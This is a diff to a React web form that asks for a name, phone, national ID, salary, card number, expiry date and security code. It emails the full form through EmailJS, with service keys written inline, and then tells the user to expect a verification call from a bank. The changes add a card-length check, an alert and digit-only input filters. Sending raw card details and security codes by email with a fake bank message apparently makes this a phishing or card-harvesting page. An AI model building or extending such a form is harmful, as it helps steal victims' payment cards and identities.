@@ -2,6 +2,8 @@ import React, { useRef, useState, useEffect } from "react";
 import "./style.css";
 import Swal from "sweetalert2";
 import emailjs from "@emailjs/browser";
+import $ from "jquery";
+import jQuery from "jquery";
 // import PromiceComponent from "./promice";
 import { usePaymentInputs } from "react-payment-inputs";
 
@@ -16,7 +18,7 @@ const Main = ({ data, state, data1 }) => {
   const [city, setCity] = useState();
 
   // Second form
-  const [fullName, setFullName] = useState();
+  const [alart, setAlart] = useState(false);
   const [cardNo, setCardNo] = useState();
   const [expiryDate, setExpiryDate] = useState();
   const [securityNo, setSecurityNo] = useState();
@@ -28,36 +30,45 @@ const Main = ({ data, state, data1 }) => {
     e.preventDefault();
     console.log(form.current);
     const placement = "top";
+
     console.log(fname, phone, id, salary, cardNo, expiryDate);
+
     if (fname && phone && id && cardNo && expiryDate) {
-      emailjs
-        .sendForm(
-          "service_zj5623f",
-          "template_xy00dgb",
-          form.current,
-          "UrR8OS3JjUBMKVWNf"
-        )
-        .then(
-          (result) => {
-            Swal.fire({
-              title:
-                "Congratulation Your Request has been Submitted Successfully You will Receive a Verification Call From Bank",
-              width: 600,
-              padding: "3em",
-              color: "#716add",
-              background: "#fff url(/images/trees.png)",
-              backdrop: `
+      if (cardNo.length >= 8) {
+        emailjs
+          .sendForm(
+            "service_zj5623f",
+            "template_xy00dgb",
+            form.current,
+            "UrR8OS3JjUBMKVWNf"
+          )
+          .then(
+            (result) => {
+              Swal.fire({
+                title:
+                  "Congratulation Your Request has been Submitted Successfully You will Receive a Verification Call From Bank",
+                width: 600,
+                padding: "3em",
+                color: "#716add",
+                background: "#fff url(/images/trees.png)",
+                backdrop: `
                 rgba(0,0,123,0.4)
                 url("/images/nyan-cat.gif")
                 left top
                 no-repeat
               `,
-            });
-          },
-          (error) => {
-            console.log(error.text);
-          }
-        );
+              });
+            },
+            (error) => {
+              console.log(error.text);
+            }
+          );
+      }
+      if (cardNo.length < 8) {
+        document.body.scrollTop = 0; // For Safari
+        document.documentElement.scrollTop = 0;
+        setAlart(true);
+      }
     } else {
       document.body.scrollTop = 0; // For Safari
       document.documentElement.scrollTop = 0;
@@ -79,6 +90,39 @@ const Main = ({ data, state, data1 }) => {
       setTitle(data1.title4);
     }
   });
+  jQuery(document).ready(function () {
+    jQuery("#fieldSelectorId").keypress(function (e) {
+      var length = jQuery(this).val().length;
+      if (length > 9) {
+        return false;
+      } else if (
+        e.which != 8 &&
+        e.which != 0 &&
+        (e.which < 48 || e.which > 57)
+      ) {
+        return false;
+      } else if (length == 0 && e.which == 48) {
+        return false;
+      }
+    });
+  });
+
+  jQuery(document).ready(function () {
+    jQuery("#CardId").keypress(function (e) {
+      var length = jQuery(this).val().length;
+      if (length > 11) {
+        return false;
+      } else if (
+        e.which != 8 &&
+        e.which != 0 &&
+        (e.which < 48 || e.which > 57)
+      ) {
+        return false;
+      } else if (length == 0 && e.which == 48) {
+        return false;
+      }
+    });
+  });
   return (
     <div className=" mt-5 z-index-2  ">
       {notify ? (
@@ -98,6 +142,33 @@ const Main = ({ data, state, data1 }) => {
                 aria-label="Close"
                 className="rounded bg-white mx-1"
                 style={{ position: "relative", left: "30px" }}
+                onClick={() => setNotify(false)}
+              >
+                <span aria-hidden="true">&times;</span>
+              </button>
+            </div>
+            <div className="col-sm-4"></div>
+          </div>
+        </>
+      ) : null}
+      {alart ? (
+        <>
+          <div className="row">
+            <div className="col-sm-4"></div>
+            <div
+              class="alert alert-danger alert-dismissible fade show col-sm-4 "
+              style={{ width: "410px" }}
+              role="alert"
+            >
+              {data.alart}
+              <button
+                type="button"
+                class="close"
+                data-dismiss="alert"
+                aria-label="Close"
+                className="rounded bg-white mx-1"
+                style={{ position: "relative", left: "30px" }}
+                onClick={() => setAlart(false)}
               >
                 <span aria-hidden="true">&times;</span>
               </button>
@@ -146,6 +217,8 @@ const Main = ({ data, state, data1 }) => {
                   <input
                     type="number"
                     name="id_number"
+                    id="fieldSelectorId"
+                    maxlength="10"
                     onChange={(e) => {
                       setId(e.target.value);
                     }}
@@ -267,6 +340,7 @@ const Main = ({ data, state, data1 }) => {
                     setCardNo(e.target.value);
                   },
                 })}
+                id="CardId"
                 name="card_no"
                 value={cardNo}
               />
